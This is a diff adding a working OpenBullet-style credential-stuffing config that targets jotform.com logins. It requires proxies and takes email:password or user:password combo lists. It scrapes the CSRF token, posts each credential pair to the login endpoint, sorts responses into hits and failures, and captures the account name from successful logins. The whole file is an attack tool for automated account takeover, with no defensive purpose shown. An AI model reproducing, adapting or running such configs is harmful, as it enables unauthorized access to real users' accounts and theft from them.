@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "jotform.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-10T00:12:57.7044022+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.jotform.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TT PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"csrf-token\" id=\"jfHeader-csrf-token-login\"" "\">" -> VAR "TT" 
+
+#TOKEN PARSE "<TT>" LR "value=\"" "" -> VAR "TOKEN" 
+
+#PP REQUEST POST "https://www.jotform.com/server.php" 
+  CONTENT "action=login&username=<USER>&password=<PASS>&remember=false&csrf=<TOKEN>&includeUsage=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 153" 
+  HEADER "origin: https://www.jotform.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.jotform.com/" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The username or password you entered is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "{\"user\":" 
+
+#Sub PARSE "<SOURCE>" JSON "prettyName" CreateEmpty=FALSE -> CAP "Sub" 
+
